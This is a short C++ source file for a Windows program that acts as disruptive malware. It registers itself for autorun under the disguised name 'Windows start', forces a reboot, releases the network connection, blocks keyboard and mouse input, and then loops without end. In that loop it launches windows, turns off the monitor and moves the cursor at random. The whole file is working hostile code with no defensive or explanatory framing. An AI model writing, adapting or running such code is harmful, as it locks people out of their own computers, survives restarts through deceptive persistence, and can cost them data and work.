#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <winable.h>
#include<algorithm>
using namespace std;
void RegisterAutoRun(void){ 
    TCHAR szPath[MAX_PATH]; 
    GetModuleFileName(NULL, szPath, MAX_PATH); 
    HKEY newValue; 
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue); 
    RegSetValueEx(newValue, "Windows start", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath)); 
    RegCloseKey(newValue); 
} 
int main(){
	long int x,y;
	RegisterAutoRun(); 
	FreeConsole();
	system("shutdown -r -t 15"); 
	system("ipconfig /release");
	BlockInput(true); 
	while(1){
		ShellExecute(NULL,"open","turn off screen.exe",NULL,NULL,SW_HIDE); 
		ShellExecute(NULL,"open","notepad.exe",NULL,NULL,SW_MAXIMIZE); 
		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
		x = rand()%1001;
    	y = rand()%801;
    	SetCursorPos(x,y);
	}
	BlockInput(false);
return 0;
}

